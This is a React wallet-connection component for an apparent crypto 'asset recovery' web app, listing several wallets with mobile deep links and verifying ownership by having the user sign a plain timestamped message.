import { useState } from 'react';
import { Wallet, LogOut, AlertCircle, Smartphone, Monitor } from 'lucide-react';
import { formatAddress } from '../utils/web3Config';
import { apiService } from '../utils/api';

export default function WalletConnection({ onConnectionChange }) {
  const [isConnecting, setIsConnecting] = useState(false);
  const [error, setError] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const [address, setAddress] = useState('');

  const wallets = [
    {
      name: 'MetaMask',
      icon: 'https://metamask.io/favicon.ico',
      fallback: 'https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/metamask.svg',
      mobile: 'https://metamask.app.link/dapp/localhost:3000',
      desktop: () => window.ethereum?.isMetaMask,
      connect: connectMetaMask
    },
    {
      name: 'Trust Wallet',
      icon: 'https://trustwallet.com/favicon.ico',
      fallback: 'https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/trustwallet.svg',
      mobile: 'https://link.trustwallet.com/open_url?coin_id=60&url=http://localhost:3000',
      desktop: () => window.ethereum?.isTrust,
      connect: connectTrust
    },
    {
      name: 'Coinbase Wallet',
      icon: 'https://www.coinbase.com/favicon.ico',
      fallback: 'https://logo.clearbit.com/coinbase.com',
      mobile: 'https://go.cb-w.com/dapp?cb_url=http://localhost:3000',
      desktop: () => window.ethereum?.isCoinbaseWallet,
      connect: connectCoinbase
    },
    {
      name: 'Ledger Live',
      icon: 'https://www.ledger.com/favicon.ico',
      fallback: 'https://logo.clearbit.com/ledger.com',
      mobile: 'ledgerlive://dapp/localhost:3000',
      desktop: () => window.ethereum?.isLedgerConnect,
      connect: connectLedger
    },
    {
      name: 'Trezor',
      icon: 'https://trezor.io/favicon.ico',
      fallback: 'https://logo.clearbit.com/trezor.io',
      mobile: false,
      desktop: () => window.TrezorConnect,
      connect: connectTrezor
    },
    {
      name: 'Exodus',
      icon: 'https://www.exodus.com/favicon.ico',
      fallback: 'https://logo.clearbit.com/exodus.com',
      mobile: 'exodus://open?url=localhost:3000',
      desktop: () => window.exodus,
      connect: connectExodus
    },
    {
      name: 'Rainbow',
      icon: 'https://rainbow.me/favicon.ico',
      fallback: 'https://logo.clearbit.com/rainbow.me',
      mobile: 'https://rnbwapp.com/localhost:3000',
      desktop: () => window.ethereum?.isRainbow,
      connect: connectRainbow
    },
    {
      name: 'MyEtherWallet',
      icon: 'https://www.myetherwallet.com/favicon.ico',
      fallback: 'https://logo.clearbit.com/myetherwallet.com',
      mobile: 'https://www.myetherwallet.com/wallet/access',
      desktop: () => window.ethereum?.isMEW,
      connect: connectMEW
    },
    {
      name: 'Atomic Wallet',
      icon: 'https://atomicwallet.io/favicon.ico',
      fallback: 'https://logo.clearbit.com/atomicwallet.io',
      mobile: 'atomic://dapp/localhost:3000',
      desktop: () => window.atomic,
      connect: connectAtomic
    },
    {
      name: 'WalletConnect',
      icon: 'https://walletconnect.com/favicon.ico',
      fallback: 'https://logo.clearbit.com/walletconnect.com',
      mobile: true,
      desktop: true,
      connect: connectWalletConnect
    }
  ];

  async function connectMetaMask() {
    if (!window.ethereum?.isMetaMask) {
      if (isMobile()) {
        window.open('https://metamask.app.link/dapp/' + window.location.host, '_blank');
        return;
      }
      setError('MetaMask not installed. Please install MetaMask extension.');
      return;
    }
    await connectWallet('metamask');
  }

  async function connectBinance() {
    if (!window.BinanceChain) {
      if (isMobile()) {
        window.open('https://app.binance.com/en/web3wallet', '_blank');
        return;
      }
      setError('Binance Wallet not installed.');
      return;
    }
    await connectWallet('binance');
  }

  async function connectCoinbase() {
    if (!window.ethereum?.isCoinbaseWallet) {
      if (isMobile()) {
        window.open('https://go.cb-w.com/dapp?cb_url=' + encodeURIComponent(window.location.href), '_blank');
        return;
      }
      setError('Coinbase Wallet not installed.');
      return;
    }
    await connectWallet('coinbase');
  }

  async function connectOKX() {
    if (!window.okxwallet) {
      if (isMobile()) {
        window.open('okx://wallet/dapp/url?dappUrl=' + encodeURIComponent(window.location.href), '_blank');
        return;
      }
      setError('OKX Wallet not installed.');
      return;
    }
    await connectWallet('okx');
  }

  async function connectTrust() {
    if (isMobile()) {
      window.open('https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(window.location.href), '_blank');
      return;
    }
    if (!window.ethereum?.isTrust) {
      setError('Trust Wallet not available on desktop. Use mobile app.');
      return;
    }
    await connectWallet('trust');
  }



  async function connectExodus() {
    if (!window.exodus) {
      if (isMobile()) {
        window.open('exodus://open?url=' + encodeURIComponent(window.location.href), '_blank');
        return;
      }
      setError('Exodus Wallet not installed.');
      return;
    }
    await connectWallet('exodus');
  }

  async function connectAtomic() {
    if (isMobile()) {
      window.open('atomic://dapp/' + window.location.host, '_blank');
      return;
    }
    setError('Atomic Wallet available on mobile only.');
  }

  async function connectLedger() {
    if (isMobile()) {
      window.open('ledgerlive://dapp/' + window.location.host, '_blank');
      return;
    }
    if (!window.ethereum?.isLedgerConnect) {
      setError('Ledger Live not connected.');
      return;
    }
    await connectWallet('ledger');
  }

  async function connectTrezor() {
    if (isMobile()) {
      setError('Trezor not available on mobile.');
      return;
    }
    setError('Trezor integration coming soon.');
  }

  async function connectRainbow() {
    if (isMobile()) {
      window.open('https://rnbwapp.com/' + window.location.host, '_blank');
      return;
    }
    if (!window.ethereum?.isRainbow) {
      setError('Rainbow Wallet not installed.');
      return;
    }
    await connectWallet('rainbow');
  }





  async function connectMEW() {
    if (isMobile()) {
      window.open('https://www.myetherwallet.com/wallet/access', '_blank');
      return;
    }
    if (!window.ethereum?.isMEW) {
      setError('MyEtherWallet not installed.');
      return;
    }
    await connectWallet('mew');
  }







  async function connectWalletConnect() {
    setError('WalletConnect integration coming soon.');
  }



  async function connectWallet(walletType) {
    setIsConnecting(true);
    setError('');
    
    try {
      let provider = window.ethereum;
      
      if (walletType === 'binance') {
        provider = window.BinanceChain;
      } else if (walletType === 'okx') {
        provider = window.okxwallet;
      }

      const accounts = await provider.request({
        method: 'eth_requestAccounts'
      });
      
      if (accounts.length > 0) {
        const walletAddress = accounts[0];
        const message = `Sign this message to verify your wallet ownership.\nTimestamp: ${Date.now()}`;
        
        const signature = await provider.request({
          method: 'personal_sign',
          params: [message, walletAddress]
        });
        
        const result = await apiService.connectWallet(walletAddress, signature, message);
        
        if (result.success) {
          setIsConnected(true);
          setAddress(walletAddress);
          onConnectionChange?.(result.user);
        } else {
          setError('Failed to verify wallet connection');
        }
      }
    } catch (err) {
      console.error('Wallet connection error:', err);
      if (err.code === 4001) {
        setError('Connection rejected by user');
      } else {
        setError('Failed to connect wallet. Please try again.');
      }
    } finally {
      setIsConnecting(false);
    }
  }

  function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  }

  const handleWalletClick = async (wallet) => {
    setError('');
    
    // Show connecting message
    setIsConnecting(true);
    
    try {
      // Call the wallet's connect function
      await wallet.connect();
      
      // Show success message if connection works
      if (isConnected) {
        alert(`Successfully connected to ${wallet.name}!\n\nYou can now scan your wallet for claimable tokens and start the recovery process.`);
      }
    } catch (err) {
      console.error(`${wallet.name} connection error:`, err);
      setError(`Failed to connect to ${wallet.name}. Please make sure it's installed and try again.`);
    } finally {
      setIsConnecting(false);
    }
  };

  const handleDisconnect = () => {
    setIsConnected(false);
    setAddress('');
    onConnectionChange?.(null);
    setError('');
  };

  if (isConnected && address) {
    return (
      <div className="flex items-center space-x-4">
        <div className="flex items-center space-x-2 bg-green-50 text-green-700 px-3 py-2 rounded-lg">
          <Wallet size={16} />
          <span className="font-medium">{formatAddress(address)}</span>
        </div>
        <button
          onClick={handleDisconnect}
          className="flex items-center space-x-2 text-gray-600 hover:text-gray-800 transition-colors"
        >
          <LogOut size={16} />
          <span>Disconnect</span>
        </button>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {error && (
        <div className="flex items-center space-x-2 bg-red-50 text-red-700 p-3 rounded-lg">
          <AlertCircle size={16} />
          <span>{error}</span>
        </div>
      )}
      
      <div className="text-center space-y-2">
        <h3 className="text-2xl font-bold">Connect Your Wallet</h3>
        <p className="text-gray-600">
          Choose your preferred wallet to start recovering your crypto assets
        </p>
        <div className="flex items-center justify-center space-x-4 text-sm text-gray-500">
          <div className="flex items-center space-x-1">
            <Monitor size={16} />
            <span>Desktop</span>
          </div>
          <div className="flex items-center space-x-1">
            <Smartphone size={16} />
            <span>Mobile</span>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {wallets.map((wallet, index) => (
          <button
            key={index}
            onClick={() => handleWalletClick(wallet)}
            disabled={isConnecting}
            className="flex items-center space-x-4 p-4 border-2 border-gray-200 rounded-xl hover:border-blue-300 hover:bg-blue-50 transition-all disabled:opacity-50 transform hover:scale-105 group"
          >
            <div className="w-12 h-12 rounded-xl overflow-hidden bg-white shadow-sm flex items-center justify-center">
              <img 
                src={wallet.icon} 
                alt={wallet.name}
                className="w-8 h-8 object-contain"
                onError={(e) => {
                  if (wallet.fallback && e.target.src !== wallet.fallback) {
                    e.target.src = wallet.fallback;
                  } else {
                    e.target.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIxIDEyQzIxIDEzLjEgMjAuMSAxNCAyMCAxNEg0QzIuOSAxNCAyIDEzLjEgMiAxMlYxMEMyIDguOSAyLjkgOCA0IDhIMjBDMjAuMSA4IDIxIDguOSAyMSAxMFYxMloiIGZpbGw9IiM2MzY2RjEiLz4KPC9zdmc+';
                  }
                }}
              />
            </div>
            <div className="flex-1 text-left">
              <div className="font-semibold text-gray-800 group-hover:text-blue-600 transition-colors">
                {wallet.name}
              </div>
              <div className="text-sm text-gray-500">
                {isMobile() ? 'Mobile App' : 'Browser Extension'}
              </div>
            </div>
            {isConnecting && (
              <div className="w-5 h-5 border-2 border-blue-600 border-t-transparent rounded-full animate-spin" />
            )}
          </button>
        ))}
      </div>

      <div className="text-center text-sm text-gray-500">
        <p>New to crypto wallets? 
          <a href="https://ethereum.org/en/wallets/" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline ml-1">
            Learn more
          </a>
        </p>
      </div>

      {isConnecting && (
        <div className="text-center text-sm text-gray-600">
          <span className="loading-dots">Connecting wallet</span>
        </div>
      )}
    </div>
  );
}